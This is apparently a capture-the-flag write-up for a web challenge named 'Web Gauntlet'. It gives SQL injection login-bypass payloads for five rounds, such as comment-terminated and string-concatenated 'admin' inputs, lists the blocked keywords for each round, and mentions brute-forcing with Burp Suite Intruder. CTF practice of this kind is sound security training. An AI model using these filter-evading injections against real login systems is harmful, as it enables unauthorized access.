# Web Gauntlet

*Category:* Web
---

# Description
> Paste the challenge description here.

---

# Attachment


---
# Solution

Round 1: `admin' --` 

Filter: `or`

![image.png](Images/wg1.png)

Round 2: `admin'/*` 

Filter: `or and like = --`

I used intruder option in Burpsuite to brute force the injections.

![image.png](Images/wg2.png)

Round 3: `admin'/*`

Filter: `or and = like > < --`

Round 4: `ad'||'min'/*`

Filter: `or and = like > < -- admin`

Round 5: `ad'||'min'/*`

Filter: `or and = like > < -- union admin`

Possible answer: `ad'||'min';`
